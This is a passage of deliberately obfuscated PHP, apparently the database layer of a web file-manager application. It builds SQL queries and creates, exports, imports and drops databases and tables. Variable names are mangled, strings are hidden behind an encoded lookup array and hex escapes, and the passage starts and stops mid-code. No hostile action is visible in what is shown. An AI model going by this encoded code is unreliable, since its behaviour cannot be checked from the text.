$¸êÀ¤€) { $¹¿‡±£À[] = $ ¶×‚ˆÒ . (is_array($¸êÀ¤€) ? $this->buildSelectSql($¸êÀ¤€) : $¸êÀ¤€); } return implode($ºİÜÌ›[53], $¹¿‡±£À); } public function insert($§ì¥Íè½, $ÀÈß¿è = array(), $ú‰õ°…˜ = false) { $Õ¯…Òù¿ =& $_SERVER[­õöî’–]; $ÔìËé·æ = $ë¹ëä¬Ò = array(); $this->model = $ÀÈß¿è[$Õ¯…Òù¿[281]]; foreach ($§ì¥Íè½ as $àŒı¶ğ· => $§ğß’ÔÄ) { if (is_array($§ğß’ÔÄ) && $Õ¯…Òù¿[297] == $§ğß’ÔÄ[0]) { $ë¹ëä¬Ò[] = $this->parseKey($àŒı¶ğ·); $ÔìËé·æ[] = $§ğß’ÔÄ[1]; } elseif (is_scalar($§ğß’ÔÄ) || is_null($§ğß’ÔÄ)) { $ë¹ëä¬Ò[] = $this->parseKey($àŒı¶ğ·); $ÔìËé·æ[] = $this->parseValue($§ğß’ÔÄ); } } $¡å¼óûÖ = ($ú‰õ°…˜ ? $Õ¯…Òù¿[904] : $Õ¯…Òù¿[905]) . $Õ¯…Òù¿[906] . $this->parseTable($ÀÈß¿è[$Õ¯…Òù¿[279]]) . $Õ¯…Òù¿[900] . implode($Õ¯…Òù¿[50], $ë¹ëä¬Ò) . $Õ¯…Òù¿[901] . implode($Õ¯…Òù¿[50], $ÔìËé·æ) . $Õ¯…Òù¿[902]; $¡å¼óûÖ .= $this->parseLock(isset($ÀÈß¿è[$Õ¯…Òù¿[834]]) ? $ÀÈß¿è[$Õ¯…Òù¿[834]] : !1); $¡å¼óûÖ .= $this->parseComment(!empty($ÀÈß¿è[$Õ¯…Òù¿[354]]) ? $ÀÈß¿è[$Õ¯…Òù¿[354]] : $Õ¯…Òù¿[12]); return $this->execute($¡å¼óûÖ, $this->parseBind(!empty($ÀÈß¿è[$Õ¯…Òù¿[285]]) ? $ÀÈß¿è[$Õ¯…Òù¿[285]] : array())); } public function selectInsert($¤À¸¤•, $±İ¼”è¾, $µí®— † = array()) { $’éÀˆ¨… =& $_SERVER[­õöî’–]; $this->model = $µí®— †[$’éÀˆ¨…[281]]; if (is_string($¤À¸¤•)) { $¤À¸¤• = explode($’éÀˆ¨…[50], $¤À¸¤•); } array_walk($¤À¸¤•, array($this, $’éÀˆ¨…[903])); $¶¥ø™Ë¶ = $’éÀˆ¨…[1038] . $this->parseTable($±İ¼”è¾) . $’éÀˆ¨…[900] . implode($’éÀˆ¨…[50], $¤À¸¤•) . $’éÀˆ¨…[1016]; $¶¥ø™Ë¶ .= $this->buildSelectSql($µí®— †); return $this->execute($¶¥ø™Ë¶, $this->parseBind(!empty($µí®— †[$’éÀˆ¨…[285]]) ? $µí®— †[$’éÀˆ¨…[285]] : array())); } public function update($£Àë§Â÷, $ïÍşÀô) { $¶€Ê«âÅ =& $_SERVER[­õöî’–]; $this->model = $ïÍşÀô[$¶€Ê«âÅ[281]]; $¢¯®±ş = $¶€Ê«âÅ[1039] . $this->parseTable($ïÍşÀô[$¶€Ê«âÅ[279]]) . $this->parseSet($£Àë§Â÷) . $this->parseWhere(!empty($ïÍşÀô[$¶€Ê«âÅ[275]]) ? $ïÍşÀô[$¶€Ê«âÅ[275]] : $¶€Ê«âÅ[12]) . $this->parseOrder(!empty($ïÍşÀô[$¶€Ê«âÅ[365]]) ? $ïÍşÀô[$¶€Ê«âÅ[365]] : $¶€Ê«âÅ[12]) . $this->parseLimit(!empty($ïÍşÀô[$¶€Ê«âÅ[292]]) ? $ïÍşÀô[$¶€Ê«âÅ[292]] : $¶€Ê«âÅ[12]) . $this->parseLock(isset($ïÍşÀô[$¶€Ê«âÅ[834]]) ? $ïÍşÀô[$¶€Ê«âÅ[834]] : !1) . $this->parseComment(!empty($ïÍşÀô[$¶€Ê«âÅ[354]]) ? $ïÍşÀô[$¶€Ê«âÅ[354]] : $¶€Ê«âÅ[12]); return $this->execute($¢¯®±ş, $this->parseBind(!empty($ïÍşÀô[$¶€Ê«âÅ[285]]) ? $ïÍşÀô[$¶€Ê«âÅ[285]] : array())); } public function delete($‚èé·ÓŞ = array()) { $ÔÁµÍ¸æ =& $_SERVER[­õöî’–]; $this->model = $‚èé·ÓŞ[$ÔÁµÍ¸æ[281]]; $Œğ„—£¢ = $ÔÁµÍ¸æ[1040] . $this->parseTable($‚èé·ÓŞ[$ÔÁµÍ¸æ[279]]) . $this->parseWhere(!empty($‚èé·ÓŞ[$ÔÁµÍ¸æ[275]]) ? $‚èé·ÓŞ[$ÔÁµÍ¸æ[275]] : $ÔÁµÍ¸æ[12]) . $this->parseOrder(!empty($‚èé·ÓŞ[$ÔÁµÍ¸æ[365]]) ? $‚èé·ÓŞ[$ÔÁµÍ¸æ[365]] : $ÔÁµÍ¸æ[12]) . $this->parseLimit(!empty($‚èé·ÓŞ[$ÔÁµÍ¸æ[292]]) ? $‚èé·ÓŞ[$ÔÁµÍ¸æ[292]] : $ÔÁµÍ¸æ[12]) . $this->parseLock(isset($‚èé·ÓŞ[$ÔÁµÍ¸æ[834]]) ? $‚èé·ÓŞ[$ÔÁµÍ¸æ[834]] : !1) . $this->parseComment(!empty($‚èé·ÓŞ[$ÔÁµÍ¸æ[354]]) ? $‚èé·ÓŞ[$ÔÁµÍ¸æ[354]] : $ÔÁµÍ¸æ[12]); return $this->execute($Œğ„—£¢, $this->parseBind(!empty($‚èé·ÓŞ[$ÔÁµÍ¸æ[285]]) ? $‚èé·ÓŞ[$ÔÁµÍ¸æ[285]] : array())); } public function select($ÉÔáóø = array()) { $úÖ†¼– =& $_SERVER[­õöî’–]; $this->model = $ÉÔáóø[$úÖ†¼–[281]]; $İÒêÚ¿ = $this->buildSelectSql($ÉÔáóø); $“ŒŠŞƒ· = isset($ÉÔáóø[$úÖ†¼–[349]]) ? $ÉÔáóø[$úÖ†¼–[349]] : !1; if ($“ŒŠŞƒ·) { $éÑ±¾Šè = is_string($“ŒŠŞƒ·[$úÖ†¼–[94]]) ? $“ŒŠŞƒ·[$úÖ†¼–[94]] : $úÖ†¼–[1041] . md5($İÒêÚ¿); $¤ÔĞŒêå = think_cache($éÑ±¾Šè, $úÖ†¼–[12], $“ŒŠŞƒ·); if (!1 !== $¤ÔĞŒêå) { return $¤ÔĞŒêå; } } $Í¦´¯š¡ = $this->query($İÒêÚ¿, $this->parseBind(!empty($ÉÔáóø[$úÖ†¼–[285]]) ? $ÉÔáóø[$úÖ†¼–[285]] : array())); if ($“ŒŠŞƒ· && !1 !== $Í¦´¯š¡) { think_cache($éÑ±¾Šè, $Í¦´¯š¡, $“ŒŠŞƒ·); } return $Í¦´¯š¡; } public function buildSelectSql($”ùÅ½Ö× = array()) { $‚¦È­ =& $_SERVER[­õöî’–]; if (isset($”ùÅ½Ö×[$‚¦È­[353]])) { if (strpos($”ùÅ½Ö×[$‚¦È­[353]], $‚¦È­[50])) { list($©èÚ±ù, $€ŠÙü‘) = explode($‚¦È­[50], $”ùÅ½Ö×[$‚¦È­[353]]); } else { $©èÚ±ù = $”ùÅ½Ö×[$‚¦È­[353]]; } $©èÚ±ù = $©èÚ±ù ? $©èÚ±ù : 1; $€ŠÙü‘ = isset($€ŠÙü‘) ? $€ŠÙü‘ : (is_numeric($”ùÅ½Ö×[$‚¦È­[292]]) ? $”ùÅ½Ö×[$‚¦È­[292]] : 20); $»Œ¤±ò¥ = $€ŠÙü‘ * ((int) $©èÚ±ù - 1); $”ùÅ½Ö×[$‚¦È­[292]] = $»Œ¤±ò¥ . $‚¦È­[50] . $€ŠÙü‘; } if (think_config($‚¦È­[1042])) { $Óª£°÷É = $‚¦È­[1043] . md5(serialize($”ùÅ½Ö×)); $ÚÄÇÄ®µ = think_cache($Óª£°÷É); if ($ÚÄÇÄ®µ) { return $ÚÄÇÄ®µ; } } $ıŠ¤° = $this->parseSql($this->selectSql, $”ùÅ½Ö×); $ıŠ¤° .= $this->parseLock(isset($”ùÅ½Ö×[$‚¦È­[834]]) ? $”ùÅ½Ö×[$‚¦È­[834]] : !1); if (isset($Óª£°÷É)) { think_cache($Óª£°÷É, $ıŠ¤°); } return $ıŠ¤°; } public function parseSql($œ¡é¬’, $Æî©”á€ = array()) { $¬›§Åò =& $_SERVER[­õöî’–]; $œ¡é¬’ = str_replace(array($¬›§Åò[1044], $¬›§Åò[1045], $¬›§Åò[1046], $¬›§Åò[1047], $¬›§Åò[1048], $¬›§Åò[1049], $¬›§Åò[1050], $¬›§Åò[1051], $¬›§Åò[1052], $¬›§Åò[1053], $¬›§Åò[1054]), array($this->parseTable("{$Æî©”á€[$¬›§Åò[279]]}"), $this->parseDistinct(isset($Æî©”á€[$¬›§Åò[1055]]) ? $Æî©”á€[$¬›§Åò[1055]] : !1), $this->parseField(!empty($Æî©”á€[$¬›§Åò[273]]) ? $Æî©”á€[$¬›§Åò[273]] : $¬›§Åò[188]), $this->parseJoin(!empty($Æî©”á€[$¬›§Åò[282]]) ? $Æî©”á€[$¬›§Åò[282]] : $¬›§Åò[12]), $this->parseWhere(!empty($Æî©”á€[$¬›§Åò[275]]) ? $Æî©”á€[$¬›§Åò[275]] : $¬›§Åò[12]), $this->parseGroup(!empty($Æî©”á€[$¬›§Åò[515]]) ? $Æî©”á€[$¬›§Åò[515]] : $¬›§Åò[12]), $this->parseHaving(!empty($Æî©”á€[$¬›§Åò[1056]]) ? $Æî©”á€[$¬›§Åò[1056]] : $¬›§Åò[12]), $this->parseOrder(!empty($Æî©”á€[$¬›§Åò[365]]) ? $Æî©”á€[$¬›§Åò[365]] : $¬›§Åò[12]), $this->parseLimit(!empty($Æî©”á€[$¬›§Åò[292]]) ? $Æî©”á€[$¬›§Åò[292]] : $¬›§Åò[12]), $this->parseUnion(!empty($Æî©”á€[$¬›§Åò[347]]) ? $Æî©”á€[$¬›§Åò[347]] : $¬›§Åò[12]), $this->parseComment(!empty($Æî©”á€[$¬›§Åò[354]]) ? $Æî©”á€[$¬›§Åò[354]] : $¬›§Åò[12])), $œ¡é¬’); return $œ¡é¬’; } public function getLastSql($ ×°íô° = '') { return $ ×°íô° ? $this->modelSql[$ ×°íô°] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¥Š´ó™Ş) { return addslashes($¥Š´ó™Ş); } public function setModel($‹º’’ò) { $this->model = $‹º’’ò; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($êŸ…Û½¨ = array()) { $»„€‚è =& $_SERVER[­õöî’–]; if (empty($êŸ…Û½¨)) { $êŸ…Û½¨ = $GLOBALS[$»„€‚è[6]][$»„€‚è[21]]; } $this->database = $êŸ…Û½¨; } public function model($ªÁÙşÁ = '') { return new ModelBase($ªÁÙşÁ, $_SERVER[­õöî’–][12], $this->database); } public function db($ÔÅ¼µ™Ö = false) { $³˜ó‡¬® =& $_SERVER[­õöî’–]; $Ã÷ìú‚¸ = array_change_key_case($this->database); if ($this->dbType() == $³˜ó‡¬®[13] || !$ÔÅ¼µ™Ö) { return $this->model()->db(); } $½’¹ì´ = $Ã÷ìú‚¸[$³˜ó‡¬®[970]]; $Ã÷ìú‚¸[$³˜ó‡¬®[970]] = $³˜ó‡¬®[12]; if ($Ã÷ìú‚¸[$³˜ó‡¬®[965]] == $³˜ó‡¬®[962]) { $«Ïµ‰êË = $Ã÷ìú‚¸[$³˜ó‡¬®[971]]; $Ã÷ìú‚¸[$³˜ó‡¬®[971]] = substr($«Ïµ‰êË, 0, strrpos($«Ïµ‰êË, $³˜ó‡¬®[1057])); } $this->database = $Ã÷ìú‚¸; $íù©“Äš = $this->model()->db(); try { $—ä“Ÿü¬ = $íù©“Äš->execute("\163\150\157\167\x20\144\x61\x74\x61\x62\141\163\145\x73\x20\x6c\x69\153\x65\40\47{$½’¹ì´}\x27"); } catch (Exception $˜Í¢‚¢æ) { } if (!$—ä“Ÿü¬) { $íù©“Äš->execute("\x63\162\x65\141\x74\x65\40\x64\141\164\141\x62\x61\163\x65\40\140{$½’¹ì´}\x60"); } $Ã÷ìú‚¸[$³˜ó‡¬®[970]] = $½’¹ì´; if ($Ã÷ìú‚¸[$³˜ó‡¬®[965]] == $³˜ó‡¬®[962]) { $Ã÷ìú‚¸[$³˜ó‡¬®[971]] .= $³˜ó‡¬®[1057] . $½’¹ì´; } $this->database = $Ã÷ìú‚¸; $íù©“Äš->execute("\165\x73\x65\x20\x60{$½’¹ì´}\x60"); return $íù©“Äš; } public function createTable($şËÕÃ¨³, &$‡¸´Ü©¦) { $Œâè“Š =& $_SERVER[­õöî’–]; if (!IO::exist($şËÕÃ¨³)) { ActionCall($Œâè“Š[1058], !0, 0); show_json(LNG($Œâè“Š[1059]), !1); } $Áª¯±ÓÉ = $this->model()->db(); $˜ÆÀĞ = sqlSplit(IO::getContent($şËÕÃ¨³)); foreach ($˜ÆÀĞ as $ÊŠŞ²àÇ) { $íÄ²Œ“ = stripos($ÊŠŞ²àÇ, $Œâè“Š[1060]) === 0; if ($íÄ²Œ“) { $‡¸´Ü©¦->task[$Œâè“Š[777]] += 1; } $Áª¯±ÓÉ->execute($ÊŠŞ²àÇ); if ($íÄ²Œ“) { preg_match($Œâè“Š[1061], $ÊŠŞ²àÇ, $­¯ÉŸ™Ã); $‡¸´Ü©¦->task[$Œâè“Š[1062]] = $­¯ÉŸ™Ã[1]; $‡¸´Ü©¦->update(1); } } } public function insertTable($ŞÑÈø´Â, &$ÅûŞç¡ï) { $û•öñŠƒ =& $_SERVER[­õöî’–]; $æ¸Œ†óÛ = $this->model()->db(); $á’ÛÖÅâ = $îóÃšãó ? array($îóÃšãó) : $æ¸Œ†óÛ->getTables(); foreach ($ŞÑÈø´Â as $Ä¬×¬Ø‘) { $îóÃšãó = basename($Ä¬×¬Ø‘, $û•öñŠƒ[779]); if (!in_array($îóÃšãó, $á’ÛÖÅâ)) { continue; } $ÅûŞç¡ï->task[$û•öñŠƒ[1062]] = $îóÃšãó; if (get_filesize($Ä¬×¬Ø‘) == 0) { continue; } $›şü˜×è = $this->sqlToDb($Ä¬×¬Ø‘, $ÅûŞç¡ï); if (!$›şü˜×è) { ActionCall($û•öñŠƒ[1058], !0, 0); show_json(LNG($û•öñŠƒ[1063]) . "\133{$îóÃšãó}\x5d", !1); } } } public function sqlFromDb($Šº¸Ç•Ô, $°¼·É¿¢, &$ãÌ½ÏÚá, $±ãÒ„û¦ = '') { if ($ãÌ½ÏÚá) { $ãÌ½ÏÚá->task[$_SERVER[­õöî’–][1062]] = $Šº¸Ç•Ô; } $æì³˜Ò¸ = $this->model($Šº¸Ç•Ô); $…ÓŒ¢Èá = 0; $ªô©°¢» = 0; $Ë³ÌèÎ = 10000; $äüıŸÒ = fopen($°¼·É¿¢, $_SERVER[­õöî’–][1064]); $Â§Û‚á† = $æì³˜Ò¸->getPk(); $öÆ÷Ù³ß = $æì³˜Ò¸->getDbFields(); $à¹Š‡³˜ = $_SERVER[­õöî’–][12]; if ($GLOBALS[$_SERVER[­õöî’–][778]] && in_array($Šº¸Ç•Ô, array($_SERVER[­õöî’–][1065], $_SERVER[­õöî’–][1066]))) { $à¹Š‡³˜ = $Šº¸Ç•Ô; } do { $­è¶ÚØ› = array($Â§Û‚á† => array($_SERVER[­õöî’–][1012], $ªô©°¢»)); $Û‰Õ¶ŞÆ = $æì³˜Ò¸->where($­è¶ÚØ›)->field($öÆ÷Ù³ß)->order($Â§Û‚á† . $_SERVER[­õöî’–][1067])->limit($Ë³ÌèÎ)->select(); $Û‰Õ¶ŞÆ = !empty($Û‰Õ¶ŞÆ) ? $Û‰Õ¶ŞÆ : array(); if (!($ÚŞÀ”õµ = count($Û‰Õ¶ŞÆ))) { break; } $ÇÀ¡¶ = end($Û‰Õ¶ŞÆ); $ªô©°¢» = $ÇÀ¡¶[$Â§Û‚á†]; $´ßß–½Ş = array(); foreach ($Û‰Õ¶ŞÆ as $úÈá×) { if ($à¹Š‡³˜) { if ($Šº¸Ç•Ô == $_SERVER[­õöî’–][1065]) { if ($úÈá×[$_SERVER[­õöî’–][33]] == $_SERVER[­õöî’–][1068]) { $¸Ñş…ª¿ = json_decode($úÈá×[$_SERVER[­õöî’–][374]], !0); if ($¸Ñş…ª¿[$_SERVER[­õöî’–][32]] == $GLOBALS[$_SERVER[­õöî’–][778]] && $¸Ñş…ª¿[$_SERVER[­õöî’–][741]] != 1) { continue; } } } else { if ($úÈá×[$_SERVER[­õöî’–][33]] == $_SERVER[­õöî’–][1069] && $úÈá×[$_SERVER[­õöî’–][94]] == $_SERVER[­õöî’–][770]) { continue; } } } if ($±ãÒ„û¦) { $úÈá×[$_SERVER[­õöî’–][84]] = "\173\x69\157\72{$±ãÒ„û¦}\175" . substr($úÈá×[$_SERVER[­õöî’–][84]], strlen("\173\151\x6f\x3a{$úÈá×[$_SERVER[­õöî’–][808]]}\x7d")); $úÈá×[$_SERVER[­õöî’–][808]] = $±ãÒ„û¦; } $´ßß–½Ş[] = $_SERVER[­õöî’–][1070] . $this->sqlEncode($úÈá×) . $_SERVER[­õöî’–][1071]; } $¨–¨ñš = "\x49\116\x53\105\122\x54\x20\111\116\x54\117\x20\140{$Šº¸Ç•Ô}\140\x20\50\140" . implode($_SERVER[­õöî’–][1072], $öÆ÷Ù³ß) . $_SERVER[­õöî’–][1073]; fwrite($äüıŸÒ, $¨–¨ñš . implode($_SERVER[­õöî’–][1074], $´ßß–½Ş) . $_SERVER[­õöî’–][71] . PHP_EOL); $…ÓŒ¢Èá += $ÚŞÀ”õµ; if ($ãÌ½ÏÚá) { $ãÌ½ÏÚá->update($ÚŞÀ”õµ); } } while ($Ë³ÌèÎ == $ÚŞÀ”õµ); fclose($äüıŸÒ); return $…ÓŒ¢Èá; } public function sqlToDb($é· °š, &$üñ¯á´É) { $ûÇ¾¸À„ =& $_SERVER[­õöî’–]; $¶•ı¥°‚ = $this->model()->db(); $û¦™ªÒ­ = @fopen($é· °š, $ûÇ¾¸À„[1075]); if (!$û¦™ªÒ­) { return !1; } $¤ñÓâæ = 0; $õ§Êè§³ = $ûÇ¾¸À„[12]; $îŒ¨›©¦ = array(); $€Šß–éş = $this->dbType(); $¹§Ì€Â = $€Šß–éş == $ûÇ¾¸À„[13] ? 500 : 2000; $åé¡ £ò = basename($é· °š, $ûÇ¾¸À„[779]); $¢†—¥Áµ = 0; $¨š¼í“ = 4194304 - 104858; $ß×áõ = 1000000 - 104858; while (!feof($û¦™ªÒ­)) { $¼÷şÔµØ = trim(fgets($û¦™ªÒ­)); if (!$¼÷şÔµØ) { continue; } $Ö” È  = $this->sqlDecode($¼÷şÔµØ, $€Šß–éş, $åé¡ £ò); if (stripos($Ö” È , $ûÇ¾¸À„[355]) === 0) { if (!$õ§Êè§³) { $õ§Êè§³ = $Ö” È  . $ûÇ¾¸À„[53]; } continue; } if ($üñ¯á´É) { $üñ¯á´É->task[$ûÇ¾¸À„[777]] += 1; } $¤ñÓâæ++; $îŒ¨›©¦[] = rtrim(rtrim(trim($Ö” È ), $ûÇ¾¸À„[50]), $ûÇ¾¸À„[71]); $ªæ¸ºªï = null; $‘®‡óª = strlen($Ö” È ); $¢†—¥Áµ += $‘®‡óª; if ($¢†—¥Áµ >= ($¹§Ì€Â == 500 ? $ß×áõ : $¨š¼í“)) { $ªæ¸ºªï = array_pop($îŒ¨›©¦); if ($¤ñÓâæ > 1) { $¤ñÓâæ--; } } if ($¤ñÓâæ >= $¹§Ì€Â || $ªæ¸ºªï) { $Ö” È  = $õ§Êè§³ . implode($ûÇ¾¸À„[50], $îŒ¨›©¦); if (!$¶•ı¥°‚->execute($Ö” È )) { return !1; } if ($üñ¯á´É) { $üñ¯á´É->update($¤ñÓâæ); } $îŒ¨›©¦ = array(); $¤ñÓâæ = 0; $¢†—¥Áµ = 0; if ($ªæ¸ºªï) { $îŒ¨›©¦ = array($ªæ¸ºªï); $¤ñÓâæ = 1; $¢†—¥Áµ = $‘®‡óª; } } } fclose($û¦™ªÒ­); if (!empty($îŒ¨›©¦)) { $Ö” È  = $õ§Êè§³ . implode($ûÇ¾¸À„[50], $îŒ¨›©¦); if (!$¶•ı¥°‚->execute($Ö” È )) { return !1; } if ($üñ¯á´É) { $üñ¯á´É->update($¤ñÓâæ); } } return !0; } public function dropTable($–¬ÍŠù = null) { $¾½õŞ±¿ = $this->model()->db(); $·ÍøÑ¢¤ = $–¬ÍŠù ? array($–¬ÍŠù) : $¾½õŞ±¿->getTables(); if (!$·ÍøÑ¢¤) { return; } foreach ($·ÍøÑ¢¤ as $–¬ÍŠù) { if ($–¬ÍŠù) { $–¬ÍŠù = strtolower($–¬ÍŠù); } else { continue; } $¾½õŞ±¿->execute("\x64\x72\x6f\160\x20\x74\141\142\x6c\145\40\151\x66\x20\x65\x78\151\163\164\x73\40\140{$–¬ÍŠù}\140"); } } private function sqlEncode($ü½øàÄñ) { $•­ä¢Ş‘ =& $_SERVER[­õöî’–]; $Æö¤ÄÁá = array(); foreach ($ü½øàÄñ as $ÀÃˆÆ©‘) { if (is_array($ÀÃˆÆ©‘)) { $ÀÃˆÆ©‘ = json_encode_force($ÀÃˆÆ©‘); } $ÀÃˆÆ©‘ = addslashes($ÀÃˆÆ©‘); $ÀÃˆÆ©‘ = str_replace(array($•­ä¢Ş‘[1076], $•­ä¢Ş‘[231]), array($•­ä¢Ş‘[1077], $•­ä¢Ş‘[1078]), $ÀÃˆÆ©‘); $Æö¤ÄÁá[] = str_replace($•­ä¢Ş‘[58], $•­ä¢Ş‘[1079], $ÀÃˆÆ©‘); } return $•­ä¢Ş‘[58] . implode($•­ä¢Ş‘[1080], $Æö¤ÄÁá) . $•­ä¢Ş‘[58]; } private function sqlDecode($¬Äğ¸™Ï, $ÇÜòÛğ€, $Âå·§ñ— = '') { $Óö…ôÈ¹ =& $_SERVER[­õöî’–]; $¬Äğ¸™Ï = str_replace(array($Óö…ôÈ¹[1077], $Óö…ôÈ¹[1078]), array($Óö…ôÈ¹[1076], $Óö…ôÈ¹[231]), $¬Äğ¸™Ï); if ($ÇÜòÛğ€ == $Óö…ôÈ¹[13]) { return $Âå·§ñ— != $Óö…ôÈ¹[1081] ? stripslashes($¬Äğ¸™Ï) : $¬Äğ¸™Ï; } if ($Âå·§ñ— == $Óö…ôÈ¹[1081]) { $¬Äğ¸™Ï = str_replace($Óö…ôÈ¹[1082], $Óö…ôÈ¹[118], stripslashes($¬Äğ¸™Ï)); } return $¬Äğ¸™Ï; } public function getSqlFile($ÆšÑ¾çò = '') { $ë”óâ· =& $_SERVER[­õöî’–]; $óšñšÓæ = $this->dbType(!0); $ÕÖÕ½‘ = CONTROLLER_DIR . "\x69\x6e\163\164\x61\154\154\57\144\141\164\141\x2f{$óšñšÓæ}\56\163\x71\x6c"; $€Ï æî = file_get_contents($ÕÖÕ½‘); $üÈ»²øƒ = $ë”óâ·[1083] . ($óšñšÓæ == $ë”óâ·[795] ? $ë”óâ·[1084] : $ë”óâ·[1085]) . $ë”óâ·[1086]; preg_match_all($üÈ»²øƒ, $€Ï æî, $‹•à); $×Œˆµì = $‹•à[1]; $Š¨Í¯Ñ = $this->model()->db(); $ªûö¥ø‘ = $Š¨Í¯Ñ->getTables(); $óÒˆöæ¹ = TEMP_FILES . $ë”óâ·[1087] . date($ë”óâ·[742]) . $ë”óâ·[8]; del_dir($óÒˆöæ¹); mk_dir($óÒˆöæ¹); $Ä¬–ëÛ¬ = $óÒˆöæ¹ . $ë”óâ·[1088]; $¹…¶àèµ = $óÒˆöæ¹ . $ë”óâ·[1089]; $ê²—Èº‰ = $óšñšÓæ == $ë”óâ·[13] ? $ë”óâ·[795] : $ë”óâ·[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\164\141\x6c\x6c\57\144\x61\164\x61\x2f{$ê²—Èº‰}\56\163\x71\x6c", $óÒˆöæ¹); @touch($óÒˆöæ¹ . $óšñšÓæ . $ë”óâ·[779]); $‹ÛãØ³‘ = fopen($Ä¬–ëÛ¬, $ë”óâ·[1064]); $Ñ¢ÒÍíÛ = fopen($¹…¶àèµ, $ë”óâ·[1064]); if ($óšñšÓæ == $ë”óâ·[13]) { $ªûö¥ø‘ = array_diff($ªûö¥ø‘, array($ë”óâ·[775], $ë”óâ·[776])); $´²ÏÉ²Ã = array($ë”óâ·[1090], $ë”óâ·[1091], $ë”óâ·[1092]); fwrite($Ñ¢ÒÍíÛ, implode(PHP_EOL, $´²ÏÉ²Ã) . PHP_EOL . PHP_EOL); foreach ($ªûö¥ø‘ as $óĞÒÇ¿£) { $ÎÏğœ’à = $this->sqlFromSqlite($óĞÒÇ¿£); if (!$ÎÏğœ’à[$ë”óâ·[13]]) { continue; } fwrite($Ñ¢ÒÍíÛ, $ÎÏğœ’à[$ë”óâ·[13]] . PHP_EOL . PHP_EOL); if (!in_array($óĞÒÇ¿£, $×Œˆµì)) { fwrite($‹ÛãØ³‘, $ÎÏğœ’à[$ë”óâ·[795]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ªûö¥ø‘ as $óĞÒÇ¿£) { $ÎÏğœ’à = $this->sqlFromMysql($óĞÒÇ¿£); if (!$ÎÏğœ’à[$ë”óâ·[795]]) { continue; } fwrite($‹ÛãØ³‘, $ÎÏğœ’à[$ë”óâ·[795]] . PHP_EOL . PHP_EOL); if (!in_array($óĞÒÇ¿£, $×Œˆµì)) { fwrite($Ñ¢ÒÍíÛ, $ÎÏğœ’à[$ë”óâ·[13]] . PHP_EOL . PHP_EOL); } } } fclose($‹ÛãØ³‘); fclose($Ñ¢ÒÍíÛ); $€Ï æî = array($ë”óâ·[795] => $Ä¬–ëÛ¬, $ë”óâ·[13] => $¹…¶àèµ); return $ÆšÑ¾çò ? $€Ï æî[$ÆšÑ¾çò] : $€Ï æî; } public function dbType($äÊÕı¨û = false) { $Àµó˜·Í =& $_SERVER[­õöî’–]; $·ûœöÏ = $äÊÕı¨û ? $GLOBALS[$Àµó˜·Í[6]][$Àµó˜·Í[21]] : $this->database; $·ûœöÏ = array_change_key_case($·ûœöÏ); $Ÿ¡‡şØ = $·ûœöÏ[$Àµó˜·Í[965]]; if ($Ÿ¡‡şØ == $Àµó˜·Í[962]) { $¯øÎŞšõ = explode($Àµó˜·Í[4], $·ûœöÏ[$Àµó˜·Í[971]]); $Ÿ¡‡şØ = $¯øÎŞšõ[0]; } $•ıÎõÑğ = array($Àµó˜·Í[1093] => $Àµó˜·Í[13], $Àµó˜·Í[909] => $Àµó˜·Í[795]); if (isset($•ıÎõÑğ[$Ÿ¡‡şØ])) { $Ÿ¡‡şØ = $•ıÎõÑğ[$Ÿ¡‡şØ]; } return $Ÿ¡‡şØ; } public function sqlFromMysql($ë¯Éªò, $£©šÎÚ˜ = '') { $€áú’êØ =& $_SERVER[­õöî’–]; $·ÈŒ·Êø = $this->model()->db(); $®“ëêÏÜ = $·ÈŒ·Êø->query($€áú’êØ[1094] . $ë¯Éªò . $€áú’êØ[385]); if (!$®“ëêÏÜ || !$®“ëêÏÜ[0]) { return !1; } $’ĞßæºŠ = _get($®“ëêÏÜ[0], $€áú’êØ[1095], $€áú’êØ[12]); if (!$’ĞßæºŠ) { return !1; } $®È±êï¼ = "\x44\x52\117\x50\x20\124\x41\102\x4c\x45\40\x49\106\40\105\x58\x49\x53\x54\123\x20\x60{$ë¯Éªò}\x60\73" . PHP_EOL . $’ĞßæºŠ . $€áú’êØ[71]; if ($£©šÎÚ˜ && $£©šÎÚ˜ == $€áú’êØ[795]) { return $®È±êï¼; } $çáÆ×Óû = array_change_key_case($GLOBALS[$€áú’êØ[6]][$€áú’êØ[21]]); $²ÎÔÜ¥ = $çáÆ×Óû[$€áú’êØ[970]]; $ª‚¤Æ„¯ = $€áú’êØ[1096] . $²ÎÔÜ¥ . $€áú’êØ[1097] . $ë¯Éªò . $€áú’êØ[58]; $æ¬¬À°÷ = $€áú’êØ[1098] . $ë¯Éªò . $€áú’êØ[897]; $™¢ÏÅ¼œ = $·ÈŒ·Êø->query($ª‚¤Æ„¯); if (empty($™¢ÏÅ¼œ)) { $¾ÓşÍì® = array($€áú’êØ[795] => $€áú’êØ[12], $€áú’êØ[13] => $€áú’êØ[12]); return $£©šÎÚ˜ ? $¾ÓşÍì®[$£©šÎÚ˜] : $¾ÓşÍì®; } $¦¸¤ÏÓÆ = $·ÈŒ·Êø->query($æ¬¬À°÷); $Ã˜·ú…ä = $€áú’êØ[12]; $œÌ“‹¡Å = array(); foreach ($¦¸¤ÏÓÆ as $òÛèÌ¡ô) { if (!$Ã˜·ú…ä && $òÛèÌ¡ô[$€áú’êØ[1099]] == $€áú’êØ[1100]) { $Ã˜·ú…ä = $òÛèÌ¡ô[$€áú’êØ[1101]]; } if (isset($œÌ“‹¡Å[$òÛèÌ¡ô[$€áú’êØ[1099]]])) { $œÌ“‹¡Å[$òÛèÌ¡ô[$€áú’êØ[1099]]][$€áú’êØ[1102]][] = $òÛèÌ¡ô[$€áú’êØ[1101]]; continue; } $œÌ“‹¡Å[$òÛèÌ¡ô[$€áú’êØ[1099]]] = array($€áú’êØ[1103] => $òÛèÌ¡ô[$€áú’êØ[1099]], $€áú’êØ[1102] => array($òÛèÌ¡ô[$€áú’êØ[1101]]), $€áú’êØ[1104] => $òÛèÌ¡ô[$€áú’êØ[1105]] == $€áú’êØ[88] ? 0 : 1); } $™ÛğÑÔÊ = array(); foreach ($œÌ“‹¡Å as $òÛèÌ¡ô) { $äıâ²‡¡ = $òÛèÌ¡ô[$€áú’êØ[1103]] == $€áú’êØ[1100]; $Ëä¾ÌŠ = array($€áú’êØ[1106], $òÛèÌ¡ô[$€áú’êØ[1104]] == $€áú’êØ[88] && 